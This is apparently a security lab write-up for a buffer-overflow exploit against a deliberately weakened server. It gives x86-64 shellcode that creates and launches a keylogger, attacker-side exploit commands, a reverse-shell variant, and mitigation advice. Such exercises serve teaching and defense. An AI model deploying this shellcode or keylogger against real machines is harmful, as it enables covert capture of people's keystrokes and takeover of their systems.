# <span style="color: yellow;">Scenario 3</span>

## Context
***
- server_data is <span style="color: red;">not accessible</span>
- stack canaries are <span style="color: red;">disabled</span>
- DEP is <span style="color: red;">disabled</span>
- ASLR is <span style="color: red;">disabled</span>

## Exploit overview
***
This exploit launches ./keylogger with code injection. The payload is injected through a buffer and exploits the bufferoverflow vulnerability to overwrite the return address.
## Challenges & Decisions
***

**Challenge 1:** installing the keylogger binary on the victim machine
This can be achieved with atleast two methods:

- Method 1: 
    * create a file with ```sys_creat```.
    * append the keylogger binary to this file with a POST. The buffer fits the whole keylogger binary.
    * start the keylogger in the same way as scenario1

- Method 2: 
    * spawn a reverse shell.
    * curl and execute the keylogger.

The advantage of Method 2 is that you have full control over the server application.You can even change the password of the victim VM.

**Challenge 2:** accessing the logged keyboard events
 - The attacker can access the logged keyboard events with a curl like in the other exploits. This is possible because our exploit starts the keylogger
   in a separate process, which preserves the functionality of the server application after the attack.


### Injected payload
#### Method 1
For this method we inject assembly code twice. The assembly code to create a file with rwx permissions and the name "keylog":
```asm
.intel_syntax noprefix
.global _start

.section .text
_start:
    xor edx, edx                    ; clear edx
    xor esi, esi                    ; clear esi
    xor eax, eax                    ; clear eax
    mov al, 57                      ; mov sys call num 57 in 8 LSB of al (fork)
    syscall                         ; syscall fork
    test eax, eax                   ; check if parent of child runs
    jnz parent                      ; parent creates file
child:
    xor eax, eax                    ; clear eax
    mov al, 60                      ; mov sys call 60 in 8 LSB of al (exit)
    xor edi, edi                    ; clear edi
    syscall                         ; exit(0)
parent:
    xor rax, rax                    ; clear rax
    mov rcx, 0x676f6c79656b2f2e     ; parent keeps executing (move ./keylog in rcx)   golyek/. -> ./keylog backwards
    push rax                        ; push null bytes to terminate the string
    push rcx                        ; push string backwards
    
    xor rsi, rsi                    ; clear rsi
    add rsi, 0111                   ; increment rsi -> rsi = 0111
    add rsi, 0111                   ; increment rsi -> rsi = 0222
    add rsi, 0111                   ; increment rsi -> rsi = 0333
    add rsi, 0111                   ; increment rsi -> rsi = 0444
    add rsi, 0111                   ; increment rsi -> rsi = 0555
    add rsi, 0111                   ; increment rsi -> rsi = 0666
    add rsi, 0111                   ; increment rsi -> rsi = 0777 -> -rwxrwxrwx

    mov rdi, rsp                    ; mov pointer to string in rdi
    add rax, 85                     ; mov 85 in 8 LSB of rax (execve)
    syscall                         ; syscall creat

```
The assembly code to launch the keylogger:
```asm
.intel_syntax noprefix
.global _start

.section .text
_start:
    xor edx, edx                    ; clear edx
    xor esi, esi                    ; clear esi
    xor eax, eax                    ; clear eax
    mov al, 57                      ; mov sys call num 57 in 8 LSB of al (fork)
    syscall                         ; syscall fork
    test eax, eax                   ; check if parent of child runs
    jnz parent                      ; parent exits
child:
    mov rcx, 0x676f6c79656b2f2e     ; child keeps executing (move ./keylog in rcx)   golyek/. -> ./keylog backwards
    push rax                        ; push null bytes to terminate the string
    push rcx                        ; push string backwards
    mov rdi, rsp                    ; mov pointer to string in rdi
    mov al, 59                      ; mov 59 in 8 LSB of rax (execve)
    syscall                         ; syscall execve
parent: 
    xor eax, eax                    ; clear eax
    mov al, 60                      ; mov sys call 60 in 8 LSB of al (exit)
    xor edi, edi                    ; clear edi
    syscall                         ; exit(0)
```

## Execution Instructions
***
Victim-side:
```shell
$ sudo ./launch_scenario 3
```

### Method 1
Attacker-side:
Make sure the keylogger binary 'keylogger' and shell-file and shell-keylog are in the same directory as the exploit script. We recommend executing this exploit on the same distro as the victim machine.
```shell
$ python3 server_sc3_1.py TARGET_IP TARGET_PORT
```
```shell
$ curl http://{TARGET}:{TARGET_PORT}/logged_keyboard_events.txt
```

### Method 2
Attacker-side:
Make sure the keylogger binary 'keylogger' is in the same directory as the exploit script. We recommend executing this exploit on the same distro as the victim machine.
```shell
$ python3 server_sc3_2.py
```
```shell
$ curl http://{TARGET}:{TARGET_PORT}/logged_keyboard_events.txt
```
Cleanup:
```shell
$ sudo ps -e
$ sudo kill <pid-keylogger>
```

## Preventive Measures
***
- Safer alternatives like ```snprintf``` should be used in ```log_message```
- Data Execution Prevention (mostly) prevents code injection unless disabled by the attacker.
- Although stack canaries and secure library function make code injection harder, they do not always prevent it outright. Canaries can be leaked.